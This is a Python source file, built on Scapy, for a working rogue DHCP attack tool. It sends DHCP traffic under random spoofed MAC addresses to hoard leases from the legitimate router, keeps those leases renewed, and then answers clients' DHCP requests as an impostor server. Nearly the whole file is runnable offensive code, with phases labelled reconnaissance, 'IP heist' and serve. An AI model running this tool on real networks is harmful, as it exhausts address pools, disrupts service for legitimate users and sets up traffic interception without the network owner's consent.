import time
import random
import socket
import threading
from scapy.all import *

# Tell Scapy not to drop packets if the IP doesn't match the interface natively
conf.checkIPaddr = False 

# --- DHCP Configuration Constants ---
DHCP_DISCOVER = 1
DHCP_OFFER = 2
DHCP_REQUEST = 3
DHCP_DECLINE = 4
DHCP_ACK = 5
DHCP_NAK = 6
DHCP_RELEASE = 7

LEASE_TIME = 3600             # 1 hour lease for our clients
RENEWAL_TIME = int(LEASE_TIME * 0.5)   # T1 Timer
REBINDING_TIME = int(LEASE_TIME * 0.875) # T2 Timer
PENDING_TIMEOUT = 10          # Seconds to hold an offer before reclaiming it

class PortableRogueDHCP:
    def __init__(self):
        self.iface = conf.iface
        self.server_mac = get_if_hwaddr(self.iface)
        self.server_ip = self.get_local_ip()
        
        self.network_info = {}
        
        # --- State Management ---
        self.available_pool = []       # IPs we stole and are free to hand out
        self.stolen_leases = {}        # Tracking upstream leases with the real router
        self.pending_offers = {}       # {client_mac: {'ip': offered_ip, 'time': timestamp}}
        self.active_leases = {}        # {client_mac: {'ip': assigned_ip, 'expiry': timestamp}}

        print(f"[VERBOSE] Initialization Complete.")
        print(f"[VERBOSE] Interface: {self.iface} | MAC: {self.server_mac} | IP: {self.server_ip}")
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80)) 
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return get_if_addr(conf.iface)

    def generate_mac(self):
        return str(RandMAC())

    def get_dhcp_options(self, packet):
        options = {}
        if packet.haslayer(DHCP):
            for opt in packet[DHCP].options:
                if isinstance(opt, tuple):
                    options[opt[0]] = opt[1]
        return options

    # ==========================================
    # PACKET BUILDER ABSTRACTIONS
    # ==========================================

    def _build_base_reply(self, client_mac_str, client_mac_bytes, xid, op=2):
        """Constructs the base Ethernet/IP/UDP/BOOTP layers for server replies."""
        eth = Ether(src=self.server_mac, dst=client_mac_str)
        ip = IP(src=self.server_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(op=op, siaddr=self.server_ip, chaddr=client_mac_bytes, xid=xid)
        return eth / ip / udp / bootp

    def build_offer(self, client_mac, client_mac_bytes, xid, offer_ip):
        base = self._build_base_reply(client_mac, client_mac_bytes, xid)
        base[BOOTP].yiaddr = offer_ip
        dhcp = DHCP(options=[
            ("message-type", DHCP_OFFER),
            ("subnet_mask", self.network_info['subnet_mask']),
            ("router", self.network_info['gateway']),
            ("domain_name_server", self.network_info['dns']),
            ("lease_time", LEASE_TIME),
            ("renewal_time", RENEWAL_TIME),
            ("rebinding_time", REBINDING_TIME),
            ("server_id", self.server_ip),
            "end"
        ])
        return base / dhcp

    def build_ack(self, client_mac, client_mac_bytes, xid, assigned_ip):
        base = self._build_base_reply(client_mac, client_mac_bytes, xid)
        base[BOOTP].yiaddr = assigned_ip
        dhcp = DHCP(options=[
            ("message-type", DHCP_ACK),
            ("subnet_mask", self.network_info['subnet_mask']),
            ("router", self.network_info['gateway']),
            ("domain_name_server", self.network_info['dns']),
            ("lease_time", LEASE_TIME),
            ("renewal_time", RENEWAL_TIME),
            ("rebinding_time", REBINDING_TIME),
            ("server_id", self.server_ip),
            "end"
        ])
        return base / dhcp

    def build_nak(self, client_mac, client_mac_bytes, xid):
        base = self._build_base_reply(client_mac, client_mac_bytes, xid)
        # NAKs explicitly set yiaddr to 0.0.0.0
        base[BOOTP].yiaddr = "0.0.0.0" 
        dhcp = DHCP(options=[
            ("message-type", DHCP_NAK),
            ("server_id", self.server_ip),
            ("message", "Requested IP invalid or unavailable"),
            "end"
        ])
        return base / dhcp

    def build_heist_request(self, mac_str, mac_bytes, xid, requested_ip=None, msg_type=DHCP_DISCOVER):
        """Constructs outbound requests to the real router for recon and heist."""
        eth = Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=mac_bytes, xid=xid)
        
        opts = [("message-type", msg_type)]
        if requested_ip:
            opts.extend([
                ("server_id", self.network_info['real_dhcp_ip']),
                ("requested_addr", requested_ip)
            ])
        opts.append("end")
        
        return eth / ip / udp / bootp / DHCP(options=opts)

    # ==========================================
    # CORE PHASES
    # ==========================================

    def phase_1_recon(self):
        print("\n[*] PHASE 1: NETWORK RECONNAISSANCE")
        probe_mac_str = self.generate_mac()
        probe_mac_bytes = mac2str(probe_mac_str)
        probe_packet = self.build_heist_request(probe_mac_str, probe_mac_bytes, random.randint(1, 900000000))
        
        ans = srp1(probe_packet, iface=self.iface, timeout=5, verbose=False)
        
        if ans and ans.haslayer(DHCP):
            opts = self.get_dhcp_options(ans)
            self.network_info['gateway'] = opts.get('router', 'Unknown')
            self.network_info['subnet_mask'] = opts.get('subnet_mask', '255.255.255.0')
            self.network_info['dns'] = opts.get('domain_name_server', '8.8.8.8')
            self.network_info['real_dhcp_ip'] = opts.get('server_id', 'Unknown')
            print(f"[+] Blueprint extracted. Gateway: {self.network_info['gateway']}")
            return True
        return False

    def phase_2_heist(self, count=10):
        print(f"\n[*] PHASE 2: IP HEIST (Targeting {count} IPs)")
        for _ in range(count):
            mac_str = self.generate_mac()
            mac_bytes = mac2str(mac_str)
            xid = random.randint(1, 900000000)
            
            discover_pkt = self.build_heist_request(mac_str, mac_bytes, xid)
            ans = srp1(discover_pkt, iface=self.iface, timeout=2, verbose=False)
            
            if ans and ans.haslayer(DHCP):
                offered_ip = ans[BOOTP].yiaddr
                lease_time = self.get_dhcp_options(ans).get('lease_time', 3600) 
                
                request_pkt = self.build_heist_request(mac_str, mac_bytes, xid, requested_ip=offered_ip, msg_type=DHCP_REQUEST)
                sendp(request_pkt, iface=self.iface, verbose=False)
                
                self.available_pool.append(offered_ip)
                self.stolen_leases[offered_ip] = {
                    'mac_str': mac_str,
                    'mac_bytes': mac_bytes,
                    'lease_time': lease_time,
                    'last_renew': time.time()
                }
                print(f"[+] Hoarded: {offered_ip} under fake MAC {mac_str}")
            time.sleep(0.2) 
        print(f"[+] Total IPs secured: {len(self.available_pool)}")

    def background_state_manager(self):
        """Manages upstream lease renewals AND downstream state cleanup."""
        print("[VERBOSE] Background State Manager Daemon started.")
        while True:
            time.sleep(5)
            current_time = time.time()
            
            # 1. Renew Upstream Leases (T1 Timer Check)
            for ip, lease_data in self.stolen_leases.items():
                if (current_time - lease_data['last_renew']) >= (lease_data['lease_time'] / 2):
                    print(f"[VERBOSE] [RENEW] Refreshing upstream lease for {ip}")
                    # Build custom renewal packet (ciaddr set)
                    eth = Ether(src=lease_data['mac_str'], dst="ff:ff:ff:ff:ff:ff")
                    ip_pkt = IP(src="0.0.0.0", dst="255.255.255.255")
                    udp = UDP(sport=68, dport=67)
                    bootp = BOOTP(ciaddr=ip, chaddr=lease_data['mac_bytes'], xid=random.randint(1, 900000000))
                    dhcp_req = DHCP(options=[("message-type", DHCP_REQUEST), ("server_id", self.network_info['real_dhcp_ip']), ("requested_addr", ip), "end"])
                    sendp(eth / ip_pkt / udp / bootp / dhcp_req, iface=self.iface, verbose=False)
                    lease_data['last_renew'] = current_time 

            # 2. Cleanup Stale Pending Offers
            stale_macs = []
            for mac, data in self.pending_offers.items():
                if current_time - data['time'] > PENDING_TIMEOUT:
                    self.available_pool.append(data['ip'])
                    stale_macs.append(mac)
                    print(f"[VERBOSE] [CLEANUP] Offer to {mac} expired. Reclaimed {data['ip']} to pool.")
            for mac in stale_macs:
                del self.pending_offers[mac]

            # 3. Cleanup Expired Active Leases
            expired_macs = []
            for mac, data in self.active_leases.items():
                if current_time > data['expiry']:
                    self.available_pool.append(data['ip'])
                    expired_macs.append(mac)
                    print(f"[VERBOSE] [CLEANUP] Active lease for {mac} expired. Reclaimed {data['ip']} to pool.")
            for mac in expired_macs:
                del self.active_leases[mac]

    def phase_3_serve(self, packet):
        if not packet.haslayer(DHCP): return

        opts = self.get_dhcp_options(packet)
        msg_type = opts.get('message-type')
        client_mac = packet[Ether].src
        client_mac_bytes = packet[BOOTP].chaddr
        xid = packet[BOOTP].xid

        if client_mac == self.server_mac: return

        # --- DORA: DISCOVER ---
        if msg_type == DHCP_DISCOVER: 
            print(f"\n[VERBOSE] >> DISCOVER from {client_mac} | XID: {xid}")
            
            # If client already has an active lease, offer the same IP
            if client_mac in self.active_leases:
                offer_ip = self.active_leases[client_mac]['ip']
                print(f"[VERBOSE] Known client. Re-offering Active IP {offer_ip}")
            # If client has a pending offer, refresh it
            elif client_mac in self.pending_offers:
                offer_ip = self.pending_offers[client_mac]['ip']
                self.pending_offers[client_mac]['time'] = time.time()
                print(f"[VERBOSE] Known client. Refreshing Pending IP {offer_ip}")
            # New client, pop from pool
            elif self.available_pool:
                offer_ip = self.available_pool.pop(0)
                self.pending_offers[client_mac] = {'ip': offer_ip, 'time': time.time()}
                print(f"[VERBOSE] New client. Offering pool IP {offer_ip}")
            else:
                print(f"[-] Pool exhausted. Cannot service {client_mac}.")
                return

            offer_pkt = self.build_offer(client_mac, client_mac_bytes, xid, offer_ip)
            sendp(offer_pkt, iface=self.iface, verbose=False)

        # --- DORA: REQUEST ---
        elif msg_type == DHCP_REQUEST: 
            requested_server_id = opts.get('server_id')
            req_ip = opts.get('requested_addr')
            # If renewing directly, requested_addr might be in ciaddr
            if not req_ip: req_ip = packet[BOOTP].ciaddr

            print(f"\n[VERBOSE] >> REQUEST from {client_mac} for {req_ip} | Target Server: {requested_server_id}")

            # VALIDATION 1: Is this request meant for us?
            if requested_server_id == self.server_ip or requested_server_id is None: 
                
                is_valid = False
                # VALIDATION 2: Does it match a pending offer?
                if client_mac in self.pending_offers and self.pending_offers[client_mac]['ip'] == req_ip:
                    is_valid = True
                    del self.pending_offers[client_mac]
                # VALIDATION 3: Is it a renewal of an active lease?
                elif client_mac in self.active_leases and self.active_leases[client_mac]['ip'] == req_ip:
                    is_valid = True

                if is_valid:
                    print(f"[+] [ACK] Request validated. Assigning {req_ip} to {client_mac}")
                    self.active_leases[client_mac] = {
                        'ip': req_ip, 
                        'expiry': time.time() + LEASE_TIME
                    }
                    ack_pkt = self.build_ack(client_mac, client_mac_bytes, xid, req_ip)
                    sendp(ack_pkt, iface=self.iface, verbose=False)
                else:
                    print(f"[-] [NAK] Invalid request from {client_mac} for {req_ip}. Sending NAK.")
                    nak_pkt = self.build_nak(client_mac, client_mac_bytes, xid)
                    sendp(nak_pkt, iface=self.iface, verbose=False)

            # Client requested an IP from another server (race condition lost)
            elif requested_server_id and requested_server_id != self.server_ip:
                print(f"[VERBOSE] [-] Client chose server {requested_server_id}.")
                if client_mac in self.pending_offers:
                    reclaimed_ip = self.pending_offers.pop(client_mac)['ip']
                    self.available_pool.append(reclaimed_ip)
                    print(f"[*] Reclaimed {reclaimed_ip} back to available pool.")

        # --- DORA: RELEASE ---
        elif msg_type == DHCP_RELEASE:
            if client_mac in self.active_leases:
                released_ip = self.active_leases.pop(client_mac)['ip']
                self.available_pool.append(released_ip)
                print(f"[+] [RELEASE] Client {client_mac} released {released_ip}. Returned to pool.")

    def start(self):
        if self.phase_1_recon():
            self.phase_2_heist(count=10)
            if self.stolen_leases:
                threading.Thread(target=self.background_state_manager, daemon=True).start()
                print("\n[*] PHASE 3: SERVER LIVE. Listening for clients...")
                sniff(filter="udp and (port 67 or 68)", prn=self.phase_3_serve, store=0, iface=self.iface)

if __name__ == "__main__":
    server = PortableRogueDHCP()
    server.start()
